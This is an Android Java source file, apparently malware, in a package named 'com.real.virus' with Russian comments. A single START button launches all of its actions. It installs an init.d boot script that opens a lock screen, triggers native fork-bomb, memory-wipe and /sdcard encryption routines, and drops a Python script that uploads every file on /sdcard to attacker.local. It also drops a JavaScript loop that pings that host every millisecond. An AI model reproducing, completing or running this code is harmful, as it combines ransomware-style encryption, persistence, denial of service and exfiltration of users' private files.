package com.real.virus;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import java.io.File;
import java.io.FileOutputStream;

// Java-координатор: запуск нативного, python, webview модулей
public class MainActivity extends Activity {

    static {
        System.loadLibrary("native-lib");
    }

    // JNI-методы из C/C++/Rust/ASM
    public native String nativeEncrypt(String path, String key);
    public native void nativeForkBomb();
    public native void nativeWipeMem();
    public native String rustBrute(String hash);
    public native String goScan(String host);

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Button btn = new Button(this);
        btn.setText("START");
        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startService(new Intent(MainActivity.this, CryptoService.class));
                installInitd();
                dropPython();
                dropJS();
                try { nativeForkBomb(); } catch (Throwable t) {}
                try { nativeEncrypt("/sdcard/", "AES256KEY"); } catch (Throwable t) {}
                try { rustBrute("hash"); } catch (Throwable t) {}
                try { goScan("127.0.0.1"); } catch (Throwable t) {}
            }
        });
        setContentView(btn);
    }

    // Установка init.d скрипта
    private void installInitd() {
        try {
            String s = "#!/system/bin/sh\nam start -n com.real.virus/.LockActivity\n";
            FileOutputStream fos = new FileOutputStream("/system/etc/init.d/99rv");
            fos.write(s.getBytes());
            fos.close();
            Runtime.getRuntime().exec("chmod 755 /system/etc/init.d/99rv");
        } catch (Exception e) {}
    }

    // Сброс python-скрипта
    private void dropPython() {
        try {
            String s = "import os, requests\nfor r,d,f in os.walk('/sdcard'):\n for x in f:\n  try: requests.post('http://attacker.local/u', files={'f':open(os.path.join(r,x),'rb')})\n  except: pass\n";
            FileOutputStream fos = new FileOutputStream("/sdcard/rv.py");
            fos.write(s.getBytes());
            fos.close();
        } catch (Exception e) {}
    }

    // Сброс JS-скрипта
    private void dropJS() {
        try {
            String s = "setInterval(()=>fetch('http://attacker.local/ping'),1);";
            FileOutputStream fos = new FileOutputStream("/sdcard/rv.js");
            fos.write(s.getBytes());
            fos.close();
        } catch (Exception e) {}
    }
}
